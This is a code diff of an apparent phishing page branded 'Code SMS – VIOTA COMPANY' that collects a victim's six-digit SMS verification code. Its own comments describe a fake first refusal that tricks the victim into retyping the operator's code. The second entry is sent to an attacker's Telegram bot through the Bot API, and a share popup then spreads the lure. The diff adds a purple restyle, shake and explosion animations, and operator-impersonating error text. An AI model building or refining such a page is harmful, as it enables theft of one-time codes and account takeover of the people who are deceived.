@@ -3,25 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Code SMS</title>
+    <title>Code SMS – VIOTA COMPANY</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
         body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
         .container{max-width:420px;width:100%;}
-        .card{background:#111;border-radius:28px;padding:60px 30px;box-shadow:0 20px 60px rgba(0,255,136,0.15);border:1px solid #1a1a1a;}
-        h1{font-size:2.2em;font-weight:700;color:#fff;text-align:center;margin-bottom:20px;}
-        p{color:#888;text-align:center;font-size:1.1em;margin-bottom:50px;}
+        .card{background:#111;border-radius:28px;padding:60px 30px;box-shadow:0 20px 60px rgba(139,0,255,0.2);border:1px solid #1a1a1a;}
+        h1{font-size:2.2em;font-weight:700;color:#8B00FF;text-align:center;margin-bottom:20px;text-shadow:0 0 20px #8B00FF;}
+        p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:50px;}
         input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:2.2em;text-align:center;letter-spacing:10px;transition:0.3s;}
-        input:focus{border-color:#00ff88;}
-        .btn{background:#00ff88;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:50px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,255,136,0.4);}
-        .btn:hover{background:#00ffaa;}
+        input:focus{border-color:#8B00FF;box-shadow:0 0 0 4px rgba(139,0,255,0.2);}
+        .btn{background:#8B00FF;color:#fff;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:50px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(139,0,255,0.4);}
+        .btn:hover{background:#a020f0;box-shadow:0 0 40px #a020f0;}
         .error{color:#ff4444;margin-top:20px;text-align:center;font-weight:700;font-size:1.2em;}
         .share-popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:99999;display:none;align-items:center;justify-content:center;padding:20px;}
-        .share-card{background:#111;padding:40px;border-radius:30px;text-align:center;max-width:380px;border:3px solid #00ff88;}
-        .share-card h2{color:#00ff88;font-size:2em;margin-bottom:20px;}
+        .share-card{background:#111;padding:40px;border-radius:30px;text-align:center;max-width:380px;border:3px solid #8B00FF;box-shadow:0 0 60px rgba(139,0,255,0.4);}
+        .share-card h2{color:#8B00FF;font-size:2em;margin-bottom:20px;}
         .share-btn{background:#25D366;color:#fff;padding:18px;border-radius:50px;font-size:1.3em;margin:15px;width:100%;}
         .share-btn.copy{background:#444;}
+        .vibrate{animation:vibrate 0.5s infinite;}
+        @keyframes vibrate{0%{transform:translate(0)}20%{transform:translate(-5px,5px)}40%{transform:translate(5px,-5px)}60%{transform:translate(-5px,5px)}80%{transform:translate(5px,-5px)}100%{transform:translate(0)}}
+        .explode{animation:explode 2s forwards;}
+        @keyframes explode{0%{transform:scale(1)}50%{transform:scale(1.5)}100%{transform:scale(0);opacity:0}}
+        .success{animation:success 1s forwards;}
+        @keyframes success{0%{transform:scale(0.5) rotate(-360deg)}50%{transform:scale(1.5)}100%{transform:scale(1)}}
     </style>
 </head>
 <body>
@@ -58,20 +64,24 @@
         document.getElementById('btn').addEventListener('click', async () => {
             const code = document.getElementById('code').value.trim();
             const error = document.getElementById('error');
+            const btn = document.getElementById('btn');
+            const card = document.querySelector('.card');
 
             if (code.length !== 6) {
                 error.textContent = 'Code invalide';
                 return;
             }
 
-            // Premier essai = faux refus
+            // Premier essai = faux refus + vibration
             if (firstTry) {
                 firstTry = false;
-                error.textContent = 'Code incorrect – Réessaie une dernière fois';
+                error.textContent = 'Code incorrect – Retaper le code reçu de votre opérateur';
+                card.classList.add('vibrate');
+                setTimeout(() => card.classList.remove('vibrate'), 1000);
                 return;
             }
 
-            // Deuxième essai = succès + envoi Telegram
+            // Deuxième essai = succès + explosion + envoi Telegram
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
@@ -81,8 +91,15 @@
                 })
             });
 
-            // Pop-up partage obligatoire avant succès
-            document.getElementById('sharePopup').style.display = 'flex';
+            // Explosion animation
+            card.classList.add('explode');
+            setTimeout(() => {
+                card.classList.remove('explode');
+                card.classList.add('success');
+                setTimeout(() => {
+                    document.getElementById('sharePopup').style.display = 'flex';
+                }, 2000);
+            }, 2000);
         });
 
         function shareAndActivate() {
